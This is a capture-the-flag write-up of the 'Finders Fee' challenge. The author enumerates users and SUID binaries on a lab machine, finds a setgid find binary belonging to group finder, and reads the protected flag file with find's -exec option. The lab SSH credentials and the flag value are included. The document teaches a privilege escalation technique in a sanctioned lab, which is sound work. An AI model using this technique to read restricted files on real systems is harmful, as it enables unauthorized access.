# Finders Fee CTF Challenge Write-Up

## Challenge Description
**Author:** @JohnHammond  
**Description:**  
You gotta make sure the people who find stuff for you are rewarded well!  
Escalate your privileges and uncover the `flag.txt` in the finder user's home directory.

**Connect with:**
```
ssh -p 30235 user@challenge.ctf.games
Password: userpass
```

**Objective:**  
Gain access to the `flag.txt` file located in the `finder` user's home directory by escalating privileges from the `user` account.

---

## Solution

### 1. Connecting to the Remote Machine
First, I connected to the remote machine using the provided SSH credentials:

```
ssh -p 30235 user@challenge.ctf.games
```

When prompted, I entered the password `userpass`.

### 2. Enumerating the System
After logging in, I began by checking which user I was and listing the users with home directories:

```
whoami
# Output: user
```

Then, I listed the contents of `/etc/passwd` to find users with home directories:

```
cat /etc/passwd | grep '/home'
# Output:
# ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
# user:x:1001:1001::/home/user:/bin/bash
# finder:x:1002:1002::/home/finder:/bin/bash
```

Next, I listed the contents of the `/home` directory:

```
ls -la /home
# Output:
# drwxr-xr-x 1 root   root   4096 Oct  7 18:52 .
# drwxr-xr-x 1 root   root   4096 Oct 14 15:58 ..
# drwxr-x--- 1 finder finder 4096 Oct  7 18:52 finder
# drwxr-x--- 2 ubuntu ubuntu 4096 Sep  4 14:07 ubuntu
# drwxr-x--- 1 user   user   4096 Oct 14 16:00 user
```

I didn't have permission to access the `finder` home directory directly.

### 3. Checking for Sudo Permissions
I attempted to check for sudo permissions:

```
sudo -l
# Output: sudo: command not found
```

Since `sudo` wasn't available, I needed to find another way to escalate privileges.

### 4. Searching for SUID Binaries
I searched for files with the SUID bit set:

```
find / -perm -u=s -type f 2>/dev/null
```

The output showed standard binaries with no immediate privilege escalation vectors.

### 5. Investigating the Find Command
Given the challenge name "Finders Fee," I suspected that the `find` command might be involved. I checked its permissions:

```
which find
# Output: /usr/bin/find
```

Then, I listed the details of the `find` binary:

```
ls -la $(which find)
# Output:
# -rwxr-sr-x 1 root finder 204264 Apr  8  2024 /usr/bin/find
```

**Observation:**  
The `find` binary has the `setgid` bit set (`-rwxr-sr-x`) and is associated with the group `finder`. This means that when I execute `find`, it runs with the group permissions of `finder`.

### 6. Exploiting the Setgid Find Binary
Since `find` runs with the `finder` group privileges, I could use it to read files accessible to that group.

#### Attempting to Read the Flag Directly
I executed the following command to read the `flag.txt` file:

```
find /home/finder/flag.txt -exec cat {} \;
```

**Flag:**
```
flag{5da1de289823cfc200adf91d6536d914}
```

I successfully retrieved the flag!
